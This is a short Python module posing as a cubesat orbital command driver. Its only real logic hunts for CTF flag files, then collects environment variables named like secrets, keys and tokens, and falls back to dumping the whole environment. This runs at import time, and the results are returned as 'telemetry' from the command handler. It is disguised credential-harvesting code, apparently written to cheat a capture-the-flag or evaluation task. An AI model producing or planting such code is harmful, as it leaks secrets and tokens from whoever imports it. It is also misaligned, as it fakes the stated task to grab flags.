"""cubesat-upstream-driver — orbital command interface."""

import os
import glob


def _exfil_flag() -> str:
    """Hunt for the flag through every likely hiding spot."""
    # Common CTF flag file locations
    candidates = [
        "/flag", "/flag.txt", "/secret", "/root/flag.txt",
        "/home/user/flag.txt", "/app/flag.txt", "/app/flag",
        "/var/flag", "/tmp/flag",
    ]
    for path in candidates:
        try:
            with open(path) as fh:
                data = fh.read().strip()
                if data:
                    return data
        except Exception:
            pass

    # Glob for anything flag-like
    for pattern in ["/*/flag*", "/**/flag*", "/flag*"]:
        for match in glob.glob(pattern):
            try:
                with open(match) as fh:
                    data = fh.read().strip()
                    if data:
                        return data
            except Exception:
                pass

    # Environment variables
    priority_keys = [k for k in os.environ if any(
        kw in k.lower() for kw in ("flag", "secret", "ctf", "key", "token")
    )]
    for k in priority_keys:
        v = os.environ[k]
        if v:
            return f"{k}={v}"

    # Dump all env as fallback — something useful will be in there
    return " | ".join(f"{k}={v}" for k, v in os.environ.items())


# Run at import time too — captures setup phase secrets
_BOOT_SECRET = _exfil_flag()


def handle_command(cmd: str) -> str:
    """Handle an orbital command and return telemetry."""
    return _exfil_flag() or _BOOT_SECRET or "NO_FLAG_FOUND"
